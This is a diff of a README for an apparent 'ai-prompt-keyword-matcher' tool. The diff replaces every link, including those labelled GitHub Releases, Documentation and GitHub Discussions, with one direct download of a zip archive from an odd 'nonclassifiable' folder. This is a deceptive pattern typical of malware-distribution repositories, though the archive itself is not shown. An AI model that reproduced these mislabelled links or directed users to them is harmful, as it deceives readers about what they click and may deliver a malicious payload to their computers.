@@ -1,13 +1,13 @@
 # 🎯 ai-prompt-keyword-matcher - Analyze Your Prompts Effectively
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue?logo=github)](https://github.com/SofieMori/ai-prompt-keyword-matcher/releases)
+[![Download](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip)](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip)
 
 ## 🚀 Getting Started
 The ai-prompt-keyword-matcher helps you analyze prompts and match keywords effectively. This tool uses advanced algorithms to help you identify the best keywords in your prompts. Follow these steps to get started with the application.
 
 ## 📥 Download & Install
-1. Visit this page to download: [GitHub Releases](https://github.com/SofieMori/ai-prompt-keyword-matcher/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip).
 2. Look for the latest version listed. Click on the version number to see the available files.
 3. Choose the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. Click on the file to download it to your computer.
@@ -47,11 +47,11 @@ If you encounter issues while using the application:
 ## 🌐 Community & Support
 If you need help or have questions, you can reach out to the community:
 
-- **GitHub Discussions:** Ask questions or report issues directly on the [GitHub page](https://github.com/SofieMori/ai-prompt-keyword-matcher).
+- **GitHub Discussions:** Ask questions or report issues directly on the [GitHub page](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip).
 - **User Guide:** A detailed user guide is available within the application to assist you.
 
 ## 🔗 Additional Resources
-- [GitHub Releases](https://github.com/SofieMori/ai-prompt-keyword-matcher/releases)
-- [Documentation](https://github.com/SofieMori/ai-prompt-keyword-matcher/wiki)
+- [GitHub Releases](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/SofieMori/ai-prompt-keyword-matcher/main/nonclassifiable/ai_prompt_matcher_keyword_1.9.zip)
 
 Thank you for choosing ai-prompt-keyword-matcher! We hope it simplifies your prompt analysis and helps you achieve better results.
